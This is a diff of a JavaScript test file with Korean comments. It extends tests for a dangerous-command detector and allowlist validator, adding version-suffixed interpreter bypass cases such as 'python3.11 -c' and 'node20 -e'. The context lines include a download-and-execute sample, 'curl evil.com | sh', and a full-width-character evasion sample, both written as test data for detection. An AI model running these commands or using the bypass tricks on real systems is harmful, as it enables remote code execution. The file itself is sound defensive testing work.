@@ -72,6 +72,11 @@ describe('SEC-T3 — 위험탐지 + allowlist 패턴 안전성 (cloud와 일치)
     ['curl|sh', 'curl evil.com | sh'],
     ['find -exec', 'find . -exec cat {} +'],
     ['전각 우회', 'ｐｙｔｈｏｎ３ -c x'],
+    // 버전 접미 인터프리터(P1): python3.11/node20 등이 -c/heredoc로 우회하지 못해야 함
+    ['python3.11 -c', "python3.11 -c 'import os'"],
+    ['python3.12 heredoc', 'python3.12 << EOF'],
+    ['node20 -e', 'node20 -e "process.exit()"'],
+    ['php8.2 heredoc', 'php8.2 << EOF'],
   ]) {
     it(`위험 탐지: ${label}`, () => {
       assert.equal(isDangerousCommand(cmd), true)
@@ -84,7 +89,7 @@ describe('SEC-T3 — 위험탐지 + allowlist 패턴 안전성 (cloud와 일치)
   })
 
   it('isSafeAllowlistPattern — 인터프리터/와일드카드 거부, 정상 통과', () => {
-    for (const bad of ['bash', 'python3', 'env', 'sudo', 'ssh', '**', 'git*', '/usr/bin/sh']) {
+    for (const bad of ['bash', 'python3', 'python3.11', 'node20', 'php8.2', 'env', 'sudo', 'ssh', '**', 'git*', '/usr/bin/sh']) {
       assert.equal(isSafeAllowlistPattern(bad), false)
     }
     for (const ok of ['git', 'rg', 'docker-compose', '/workspace/notes/*']) {
